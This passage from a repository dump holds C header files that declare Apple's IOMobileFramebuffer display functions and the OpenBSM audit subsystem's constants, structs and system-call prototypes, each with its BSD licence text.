typedef struct __IOMobileFramebuffer *IOMobileFramebufferRef;
typedef CGSize IOMobileFramebufferDisplaySize;

__BEGIN_DECLS

IOMobileFramebufferReturn
IOMobileFramebufferGetMainDisplay(IOMobileFramebufferRef *pointer);

IOMobileFramebufferReturn
IOMobileFramebufferGetSecondaryDisplay(IOMobileFramebufferRef *pointer);

IOMobileFramebufferReturn
IOMobileFramebufferGetDisplaySize(IOMobileFramebufferRef pointer, IOMobileFramebufferDisplaySize *size);

IOMobileFramebufferReturn
IOMobileFramebufferGetLayerDefaultSurface(IOMobileFramebufferRef pointer, int surface, IOSurfaceRef *buffer);

IOMobileFramebufferReturn
IOMobileFramebufferSwapBegin(IOMobileFramebufferRef pointer, int *token);

IOMobileFramebufferReturn
IOMobileFramebufferSwapEnd(IOMobileFramebufferRef pointer);

IOMobileFramebufferReturn
IOMobileFramebufferSwapSetLayer(IOMobileFramebufferRef pointer, int layerid, IOSurfaceRef buffer, CGRect bounds, CGRect frame, int flags);

__END_DECLS

#endif
```

`BaseBin/_external/include/bsm/audit.h`:

```h
/*-
 * Copyright (c) 2005-2009 Apple Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1.  Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 * 2.  Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 * 3.  Neither the name of Apple Inc. ("Apple") nor the names of
 *     its contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY APPLE AND ITS CONTRIBUTORS "AS IS" AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL APPLE OR ITS CONTRIBUTORS BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $P4: //depot/projects/trustedbsd/openbsm/sys/bsm/audit.h#10 $
 */

#ifndef _BSM_AUDIT_H
#define _BSM_AUDIT_H

#include <sys/param.h>
#include <sys/types.h>
#include <mach/mach.h>

#define AUDIT_RECORD_MAGIC      0x828a0f1b
#define MAX_AUDIT_RECORDS       20
#define MAXAUDITDATA            (0x8000 - 1)
#define MAX_AUDIT_RECORD_SIZE   MAXAUDITDATA
#define MIN_AUDIT_FILE_SIZE     (512 * 1024)

/*
 * Minimum noumber of free blocks on the filesystem containing the audit
 * log necessary to avoid a hard log rotation. DO NOT SET THIS VALUE TO 0
 * as the kernel does an unsigned compare, plus we want to leave a few blocks
 * free so userspace can terminate the log, etc.
 */
#define AUDIT_HARD_LIMIT_FREE_BLOCKS    4

/*
 * Triggers for the audit daemon.
 */
#define AUDIT_TRIGGER_MIN               1
#define AUDIT_TRIGGER_LOW_SPACE         1       /* Below low watermark. */
#define AUDIT_TRIGGER_ROTATE_KERNEL     2       /* Kernel requests rotate. */
#define AUDIT_TRIGGER_READ_FILE         3       /* Re-read config file. */
#define AUDIT_TRIGGER_CLOSE_AND_DIE     4       /* Terminate audit. */
#define AUDIT_TRIGGER_NO_SPACE          5       /* Below min free space. */
#define AUDIT_TRIGGER_ROTATE_USER       6       /* User requests rotate. */
#define AUDIT_TRIGGER_INITIALIZE        7       /* User initialize of auditd. */
#define AUDIT_TRIGGER_EXPIRE_TRAILS     8       /* User expiration of trails. */
#define AUDIT_TRIGGER_MAX               8

/*
 * The special device filename (FreeBSD).
 */
#define AUDITDEV_FILENAME       "audit"
#define AUDIT_TRIGGER_FILE      ("/dev/" AUDITDEV_FILENAME)

/*
 * Pre-defined audit IDs
 */
#define AU_DEFAUDITID   (uid_t)(-1)
#define AU_DEFAUDITSID   0
#define AU_ASSIGN_ASID  -1

/*
 * IPC types.
 */
#define AT_IPC_MSG      ((unsigned char)1)      /* Message IPC id. */
#define AT_IPC_SEM      ((unsigned char)2)      /* Semaphore IPC id. */
#define AT_IPC_SHM      ((unsigned char)3)      /* Shared mem IPC id. */

/*
 * Audit conditions.
 */
#define AUC_UNSET               0
#define AUC_AUDITING            1
#define AUC_NOAUDIT             2
#define AUC_DISABLED            -1

/*
 * auditon(2) commands.
 */
#define A_OLDGETPOLICY  2
#define A_OLDSETPOLICY  3
#define A_GETKMASK      4
#define A_SETKMASK      5
#define A_OLDGETQCTRL   6
#define A_OLDSETQCTRL   7
#define A_GETCWD        8
#define A_GETCAR        9
#define A_GETSTAT       12
#define A_SETSTAT       13
#define A_SETUMASK      14
#define A_SETSMASK      15
#define A_OLDGETCOND    20
#define A_OLDSETCOND    21
#define A_GETCLASS      22
#define A_SETCLASS      23
#define A_GETPINFO      24
#define A_SETPMASK      25
#define A_SETFSIZE      26
#define A_GETFSIZE      27
#define A_GETPINFO_ADDR 28
#define A_GETKAUDIT     29
#define A_SETKAUDIT     30
#define A_SENDTRIGGER   31
#define A_GETSINFO_ADDR 32
#define A_GETPOLICY     33
#define A_SETPOLICY     34
#define A_GETQCTRL      35
#define A_SETQCTRL      36
#define A_GETCOND       37
#define A_SETCOND       38
#define A_GETSFLAGS     39
#define A_SETSFLAGS     40
#define A_GETCTLMODE    41
#define A_SETCTLMODE    42
#define A_GETEXPAFTER   43
#define A_SETEXPAFTER   44

/*
 * Audit policy controls.
 */
#define AUDIT_CNT       0x0001
#define AUDIT_AHLT      0x0002
#define AUDIT_ARGV      0x0004
#define AUDIT_ARGE      0x0008
#define AUDIT_SEQ       0x0010
#define AUDIT_WINDATA   0x0020
#define AUDIT_USER      0x0040
#define AUDIT_GROUP     0x0080
#define AUDIT_TRAIL     0x0100
#define AUDIT_PATH      0x0200
#define AUDIT_SCNT      0x0400
#define AUDIT_PUBLIC    0x0800
#define AUDIT_ZONENAME  0x1000
#define AUDIT_PERZONE   0x2000

/*
 * Default audit queue control parameters.
 */
#define AQ_HIWATER      100
#define AQ_MAXHIGH      10000
#define AQ_LOWATER      10
#define AQ_BUFSZ        MAXAUDITDATA
#define AQ_MAXBUFSZ     1048576

/*
 * Default minimum percentage free space on file system.
 */
#define AU_FS_MINFREE   20

/*
 * Type definitions used indicating the length of variable length addresses
 * in tokens containing addresses, such as header fields.
 */
#define AU_IPv4         4
#define AU_IPv6         16

/*
 * Reserved audit class mask indicating which classes are unable to have
 * events added or removed by unentitled processes.
 */
#define AU_CLASS_MASK_RESERVED 0x10000000

/*
 * Audit control modes
 */
#define AUDIT_CTLMODE_NORMAL ((unsigned char)1)
#define AUDIT_CTLMODE_EXTERNAL ((unsigned char)2)

/*
 * Audit file expire_after op modes
 */
#define AUDIT_EXPIRE_OP_AND ((unsigned char)0)
#define AUDIT_EXPIRE_OP_OR ((unsigned char)1)

__BEGIN_DECLS

typedef uid_t           au_id_t;
typedef pid_t           au_asid_t;
typedef u_int16_t       au_event_t;
typedef u_int16_t       au_emod_t;
typedef u_int32_t       au_class_t;
typedef u_int64_t       au_asflgs_t __attribute__ ((aligned(8)));
typedef unsigned char   au_ctlmode_t;

struct au_tid {
	dev_t           port;
	u_int32_t       machine;
};
typedef struct au_tid   au_tid_t;

struct au_tid_addr {
	dev_t           at_port;
	u_int32_t       at_type;
	u_int32_t       at_addr[4];
};
typedef struct au_tid_addr      au_tid_addr_t;

struct au_mask {
	unsigned int    am_success;     /* Success bits. */
	unsigned int    am_failure;     /* Failure bits. */
};
typedef struct au_mask  au_mask_t;

struct auditinfo {
	au_id_t         ai_auid;        /* Audit user ID. */
	au_mask_t       ai_mask;        /* Audit masks. */
	au_tid_t        ai_termid;      /* Terminal ID. */
	au_asid_t       ai_asid;        /* Audit session ID. */
};
typedef struct auditinfo        auditinfo_t;

struct auditinfo_addr {
	au_id_t         ai_auid;        /* Audit user ID. */
	au_mask_t       ai_mask;        /* Audit masks. */
	au_tid_addr_t   ai_termid;      /* Terminal ID. */
	au_asid_t       ai_asid;        /* Audit session ID. */
	au_asflgs_t     ai_flags;       /* Audit session flags. */
};
typedef struct auditinfo_addr   auditinfo_addr_t;

struct auditpinfo {
	pid_t           ap_pid;         /* ID of target process. */
	au_id_t         ap_auid;        /* Audit user ID. */
	au_mask_t       ap_mask;        /* Audit masks. */
	au_tid_t        ap_termid;      /* Terminal ID. */
	au_asid_t       ap_asid;        /* Audit session ID. */
};
typedef struct auditpinfo       auditpinfo_t;

struct auditpinfo_addr {
	pid_t           ap_pid;         /* ID of target process. */
	au_id_t         ap_auid;        /* Audit user ID. */
	au_mask_t       ap_mask;        /* Audit masks. */
	au_tid_addr_t   ap_termid;      /* Terminal ID. */
	au_asid_t       ap_asid;        /* Audit session ID. */
	au_asflgs_t     ap_flags;       /* Audit session flags. */
};
typedef struct auditpinfo_addr  auditpinfo_addr_t;

struct au_session {
	auditinfo_addr_t        *as_aia_p;      /* Ptr to full audit info. */
	au_mask_t                as_mask;       /* Process Audit Masks. */
};
typedef struct au_session       au_session_t;

struct au_expire_after {
	time_t age;             /* Age after which trail files should be expired */
	size_t size;    /* Aggregate trail size when files should be expired */
	unsigned char op_type; /* Operator used with the above values to determine when files should be expired */
};
typedef struct au_expire_after au_expire_after_t;

/*
 * Contents of token_t are opaque outside of libbsm.
 */
typedef struct au_token token_t;

/*
 * Kernel audit queue control parameters:
 *                      Default:		Maximum:
 *      aq_hiwater:	AQ_HIWATER (100)	AQ_MAXHIGH (10000)
 *      aq_lowater:	AQ_LOWATER (10)		<aq_hiwater
 *      aq_bufsz:	AQ_BUFSZ (32767)	AQ_MAXBUFSZ (1048576)
 *      aq_delay:	20			20000 (not used)
 */
struct au_qctrl {
	int     aq_hiwater;     /* Max # of audit recs in queue when */
	                        /* threads with new ARs get blocked. */

	int     aq_lowater;     /* # of audit recs in queue when */
	                        /* blocked threads get unblocked. */

	int     aq_bufsz;       /* Max size of audit record for audit(2). */
	int     aq_delay;       /* Queue delay (not used). */
	int     aq_minfree;     /* Minimum filesystem percent free space. */
};
typedef struct au_qctrl au_qctrl_t;

/*
 * Structure for the audit statistics.
 */
struct audit_stat {
	unsigned int    as_version;
	unsigned int    as_numevent;
	int             as_generated;
	int             as_nonattrib;
	int             as_kernel;
	int             as_audit;
	int             as_auditctl;
	int             as_enqueue;
	int             as_written;
	int             as_wblocked;
	int             as_rblocked;
	int             as_dropped;
	int             as_totalsize;
	unsigned int    as_memused;
};
typedef struct audit_stat       au_stat_t;

/*
 * Structure for the audit file statistics.
 */
struct audit_fstat {
	u_int64_t       af_filesz;
	u_int64_t       af_currsz;
};
typedef struct audit_fstat      au_fstat_t;

/*
 * Audit to event class mapping.
 */
struct au_evclass_map {
	au_event_t      ec_number;
	au_class_t      ec_class;
};
typedef struct au_evclass_map   au_evclass_map_t;

/*
 * Audit system calls.
 */
#if !defined(_KERNEL) && !defined(KERNEL)
int     audit(const void *, int);
int     auditon(int, void *, int);
int     auditctl(const char *);
int     getauid(au_id_t *);
int     setauid(const au_id_t *);
int     getaudit_addr(struct auditinfo_addr *, int);
int     setaudit_addr(const struct auditinfo_addr *, int);

#if defined(__APPLE__)
#include <Availability.h>

/*
 * getaudit()/setaudit() are deprecated and have been replaced with
 * wrappers to the getaudit_addr()/setaudit_addr() syscalls above.
 */

int     getaudit(struct auditinfo *)
__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_0, __MAC_10_8,
    __IPHONE_2_0, __IPHONE_6_0);
int     setaudit(const struct auditinfo *)
__OSX_AVAILABLE_BUT_DEPRECATED(__MAC_10_0, __MAC_10_8,
    __IPHONE_2_0, __IPHONE_6_0);
#else

int     getaudit(struct auditinfo *);
int     setaudit(const struct auditinfo *);
#endif /* !__APPLE__ */

#ifdef __APPLE_API_PRIVATE
#include <mach/port.h>
mach_port_name_t audit_session_self(void);
au_asid_t        audit_session_join(mach_port_name_t port);
int              audit_session_port(au_asid_t asid, mach_port_name_t *portname);
#endif /* __APPLE_API_PRIVATE */

uid_t audit_token_to_euid(audit_token_t at);
uid_t audit_token_to_pid(audit_token_t at);
#endif /* defined(_KERNEL) || defined(KERNEL) */

__END_DECLS

#endif /* !_BSM_AUDIT_H */

```

`BaseBin/_external/include/bsm/audit_filter.h`:

```h
/*-
 * Copyright (c) 2006 Robert N. M. Watson
 * All rights reserved.
 *
 * This software was developed by Robert Watson for the TrustedBSD Project.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * $P4: //depot/projects/trustedbsd/openbsm/bsm/audit_filter.h#4 $
 */

#ifndef _BSM_AUDIT_FILTER_H_
#define	_BSM_AUDIT_FILTER_H_

#include <bsm/libbsm.h>

/*
 * Module interface for audit filter modules.
 *
 * audit_filter_attach_t - filter module is being attached with arguments
 * audit_filter_reinit_t - arguments to module have changed
 * audit_filter_record_t - present parsed record to filter module, with
 *                         receipt time
 * audit_filter_rawrecord_t - present BSM format record to filter module,
 *                            with receipt time
 * audit_filter_destach_t - filter module is being detached
 *
 * There may be many instances of the same filter, identified by the instance
 * void pointer maintained by the filter instance.
 */
typedef int (*audit_filter_attach_t)(void *instance, int argc, char *argv[]);
typedef int (*audit_filter_reinit_t)(void *instance, int argc, char *argv[]);
typedef void (*audit_filter_record_t)(void *instance, struct timespec *ts,
	    int token_count, const tokenstr_t tok[]);
typedef void (*audit_filter_rawrecord_t)(void *instance, struct timespec *ts,
	    void *data, u_int len);
typedef void (*audit_filter_detach_t)(void *instance);


/*
 * Values to be returned by audit_filter_init_t.
 */
#define	AUDIT_FILTER_SUCCESS	(0)
#define	AUDIT_FILTER_FAILURE	(-1)

/*
 * Standard name for filter module initialization functions, which will be
 * found using dlsym().
 */
#define	AUDIT_FILTER_ATTACH	audit_filter_attach
#define	AUDIT_FILTER_REINIT	audit_filter_reinit
#define	AUDIT_FILTER_RECORD	audit_filter_record
#define	AUDIT_FILTER_RAWRECORD	audit_filter_rawrecord
#define	AUDIT_FILTER_DETACH	audit_filter_detach
#define	AUDIT_FILTER_ATTACH_STRING	"audit_filter_attach"
#define	AUDIT_FILTER_REINIT_STRING	"audit_filter_reinit"
#define	AUDIT_FILTER_RECORD_STRING	"audit_filter_record"
#define	AUDIT_FILTER_RAWRECORD_STRING	"audit_filter_rawrecord"
#define	AUDIT_FILTER_DETACH_STRING	"audit_filter_detach"

#endif /* !_BSM_AUDIT_FILTER_H_ */

```

`BaseBin/_external/include/bsm/audit_session.h`:

```h
/*-
 * Copyright (c) 2009 Apple Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1.  Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 * 2.  Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 * 3.  Neither the name of Apple Inc. ("Apple") nor the names of
 *     its contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY APPLE AND ITS CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL APPLE OR ITS CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
 * IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * $P4: //depot/projects/trustedbsd/openbsm/bsm/auditd_lib.h#4 $
 */

#ifndef _BSM_AUDIT_SESSION_H_
#define	_BSM_AUDIT_SESSION_H_

#include <inttypes.h>		/* Required for audit.h. */
#include <stdio.h>		/* Required for FILE. */

#include <bsm/audit.h>
#include <bsm/audit_kevents.h>	/* Required for AUE_SESSION_* event def's. */

#include <os/availability.h>

/* Defined audit session flags for the ai_flags member of auditinfo_addr.
 * These are opaque to XNU itself, although some may be of interest to certain
 * kernel extensions, notably AU_SESSION_FLAG_HAS_CONSOLE_ACCESS.
 */
enum audit_session_flags {
        /* The initial session created by PID 1. */
        AU_SESSION_FLAG_IS_INITIAL         = 0x0001,

        /* The graphics subsystem (CoreGraphics, etc.) is available. */
        AU_SESSION_FLAG_HAS_GRAPHIC_ACCESS = 0x0010,

        /* /dev/tty is available. */
        AU_SESSION_FLAG_HAS_TTY            = 0x0020,

        /* The session was created for a remote connection. */
        AU_SESSION_FLAG_IS_REMOTE          = 0x1000,

        /* The console and associated devices are available. */
        AU_SESSION_FLAG_HAS_CONSOLE_ACCESS = 0x2000,

        /* An active, authenticated user is associated with the session. */
        AU_SESSION_FLAG_HAS_AUTHENTICATED =  0x4000,
};

/*
 * Audit session device.
 */

#define	AUDIT_SDEV_PATH		"/dev/auditsessions"

/*
 * au_sdev_open() flags
 */
enum au_sdev_open_flags {
	/* Set audit session device to not to block on reads. */
	AU_SDEVF_NONBLOCK		= 0x00000001,


	/* Allow process to monitor all session. (Requires privilege.) */
	AU_SDEVF_ALLSESSIONS		= 0x00010000,
};

__BEGIN_DECLS
/*
 * Audit session device handle.
 */
typedef struct au_sdev_handle {
	FILE		*ash_fp;
	u_char		*ash_buf;
	int		 ash_reclen;
	int		 ash_bytesread;
} au_sdev_handle_t;

/*
 * au_sdev_open()
 *
 * @summary - Open the audit session pseudo device.
 *
 * @param flags - Flags that change the behavior of the device.  The flags
 * specified are formed by or'ing the following flag: AU_SDEVF_NONBLOCK for
 * non-blocking I/O and AU_SDEF_ALLSESSIONS for monitoring all the sessions
 * and not just the session of the current process.
 *
 * @return Upon success returns the audit session device handle.  Otherwise,
 * NULL is returned and the errno is set to indicate the error.
 */
au_sdev_handle_t *au_sdev_open(int flags)
	API_AVAILABLE(macos(10.8)) API_UNAVAILABLE(ios, watchos, tvos);

/*
 * au_sdev_close()
 *
 * @summary - Close the audit session pseudo device.
 *
 * @param ash - Audit session device handle.
 *
 * @return Upon successful completion 0 is returned.  Otherwise, errno is set
 * to indicate the error.
 */
int au_sdev_close(au_sdev_handle_t *ash)
	API_AVAILABLE(macos(10.8)) API_UNAVAILABLE(ios, watchos, tvos);

/*
 * au_sdev_fd()
 *
 * @summary - Get the file descriptor for the audit session device.
 *
 * @param ash - Audit session device handle.
 *
 * @return File descriptor of the audit session device.
 */
int au_sdev_fd(au_sdev_handle_t *ash)
	API_AVAILABLE(macos(10.8)) API_UNAVAILABLE(ios, watchos, tvos);

/*
 * au_sdev_read_aia()
 *
 * @summary - Read a session event and an auditinfo_addr record from kernel.
 *
 * @param ash - Audit session device handle.
 *
 * @param event - A pointer to an integer that will contain the event type:
 * AUE_SESSION_START (start of a new session), AUE_SESSION_UPDATE (the 
 * session information has been changed), AUE_SESSION_END (all the processes in
 * the session have exited), and AUE_SESSION_CLOSE (the session record has been
 * removed from the kernel).
 *
 * @param aia_p - A pointer to an auditinfo_addr structure that will contain the
 * audit session information on a successful return. The audit masks fields
 * (ai_mask), however, does not currently contain correct informaiton.
 *
 * @return Upon sucessful completetion 0 is returned and the event and aia_p 
 * parameters will be populated.  Otherwise, errno is set to indicate the error.
 */
int au_sdev_read_aia(au_sdev_handle_t *ash, int *event, auditinfo_addr_t *aia_p)
	API_AVAILABLE(macos(10.8)) API_UNAVAILABLE(ios, watchos, tvos);

__END_DECLS

#endif /* !_BSM_AUDIT_SESSION_H_ */

```

`BaseBin/_external/include/bsm/audit_uevents.h`:

```h
/*-
 * Copyright (c) 2004-2008 Apple Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1.  Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 * 2.  Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 * 3.  Neither the name of Apple Inc. ("Apple") nor the names of
 *     its contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY APPLE AND ITS CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL APPLE OR ITS CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
 * IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * $P4: //depot/projects/trustedbsd/openbsm/bsm/audit_uevents.h#11 $
 */

#ifndef _BSM_AUDIT_UEVENTS_H_
#define	_BSM_AUDIT_UEVENTS_H_

/*
 * Solaris userspace events.
 */
#define	AUE_at_create		6144
#define	AUE_at_delete		6145
#define	AUE_at_perm		6146
#define	AUE_cron_invoke		6147
#define	AUE_crontab_create	6148
#define	AUE_crontab_delete	6149
#define	AUE_crontab_perm	6150
#define	AUE_inetd_connect	6151
#define	AUE_login		6152
#define	AUE_logout		6153
#define	AUE_telnet		6154
#define	AUE_rlogin		6155
#define	AUE_mountd_mount	6156
#define	AUE_mountd_umount	6157
#define	AUE_rshd		6158
#define	AUE_su			6159
#define	AUE_halt		6160
#define	AUE_reboot		6161
#define	AUE_rexecd		6162
#define	AUE_passwd		6163
#define	AUE_rexd		6164
#define	AUE_ftpd		6165
#define	AUE_init		6166
#define	AUE_uadmin		6167
#define	AUE_shutdown		6168
#define	AUE_poweroff		6169
#define	AUE_crontab_mod		6170
#define	AUE_ftpd_logout		6171
#define	AUE_ssh			6172
#define	AUE_role_login		6173
#define	AUE_prof_cmd		6180
#define	AUE_filesystem_add	6181
#define	AUE_filesystem_delete	6182
#define	AUE_filesystem_modify	6183
#define	AUE_allocate_succ	6200
#define	AUE_allocate_fail	6201
#define	AUE_deallocate_succ	6202
#define	AUE_deallocate_fail	6203
#define	AUE_listdevice_succ	6205
#define	AUE_listdevice_fail	6206
#define	AUE_create_user		6207
#define	AUE_modify_user		6208
#define	AUE_delete_user		6209
#define	AUE_disable_user	6210
#define	AUE_enable_user		6211
#define	AUE_newgrp_login	6212
#define	AUE_admin_authentication	6213
#define	AUE_kadmind_auth	6214
#define	AUE_kadmind_unauth	6215
#define	AUE_krb5kdc_as_req	6216
#define	AUE_krb5kdc_tgs_req	6217
#define	AUE_krb5kdc_tgs_req_2ndtktmm	6218
#define	AUE_krb5kdc_tgs_req_alt_tgt	6219

/*
 * Historic Darwin use of the low event numbering space, which collided with
 * the Solaris event space.  Now obsoleted and new, higher, event numbers
 * assigned to make it easier to interpret Solaris events using the OpenBSM
 * tools.
 */
#define	AUE_DARWIN_audit_startup	6171
#define	AUE_DARWIN_audit_shutdown	6172
#define	AUE_DARWIN_sudo			6300
#define	AUE_DARWIN_modify_password	6501
#define	AUE_DARWIN_create_group		6511
#define	AUE_DARWIN_delete_group		6512
#define	AUE_DARWIN_modify_group		6513
#define	AUE_DARWIN_add_to_group		6514
#define	AUE_DARWIN_remove_from_group	6515
#define	AUE_DARWIN_revoke_obj		6521
#define	AUE_DARWIN_lw_login		6600
#define	AUE_DARWIN_lw_logout		6601
#define	AUE_DARWIN_auth_user		7000
#define	AUE_DARWIN_ssconn		7001
#define	AUE_DARWIN_ssauthorize		7002
#define	AUE_DARWIN_ssauthint		7003

/*
 * Historic/third-party appliation allocations of event idenfiers.
 */
#define	AUE_openssh		32800

/*
 * OpenBSM-managed application event space.
 */
#define	AUE_audit_startup	45000		/* Darwin-specific. */
#define	AUE_audit_shutdown	45001		/* Darwin-specific. */
#define	AUE_modify_password	45014		/* Darwin-specific. */
#define	AUE_create_group	45015		/* Darwin-specific. */
#define	AUE_delete_group	45016		/* Darwin-specific. */
#define	AUE_modify_group	45017		/* Darwin-specific. */
#define	AUE_add_to_group	45018		/* Darwin-specific. */
#define	AUE_remove_from_group	45019		/* Darwin-specific. */
#define	AUE_revoke_obj		45020		/* Darwin-specific. */
#define	AUE_lw_login		45021		/* Darwin-specific. */
#define	AUE_lw_logout		45022		/* Darwin-specific. */
#define	AUE_auth_user		45023		/* Darwin-specific. */
#define	AUE_ssconn		45024		/* Darwin-specific. */
#define	AUE_ssauthorize		45025		/* Darwin-specific. */
#define	AUE_ssauthint		45026		/* Darwin-specific. */
#define	AUE_calife		45027		/* OpenBSM-allocated. */
#define	AUE_sudo		45028		/* OpenBSM-allocated. */
#define	AUE_audit_recovery	45029		/* OpenBSM-allocated. */
#define	AUE_ssauthmech		45030		/* Darwin-specific. */
#define	AUE_sec_assessment	45031		/* Darwin-specific. */

#endif /* !_BSM_AUDIT_UEVENTS_H_ */

```

`BaseBin/_external/include/bsm/libbsm.h`:

```h
/*-
 * Copyright (c) 2005-2009 Apple Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1.  Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 * 2.  Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 * 3.  Neither the name of Apple Inc. ("Apple") nor the names of
 *     its contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY APPLE AND ITS CONTRIBUTORS "AS IS" AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL APPLE OR ITS CONTRIBUTORS BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $P4: //depot/projects/trustedbsd/openbsm/sys/bsm/audit.h#10 $
 */

#ifndef _BSM_AUDIT_H
#define _BSM_AUDIT_H

#include <sys/param.h>
#include <sys/types.h>

#define AUDIT_RECORD_MAGIC      0x828a0f1b
#define MAX_AUDIT_RECORDS       20
#define MAXAUDITDATA            (0x8000 - 1)
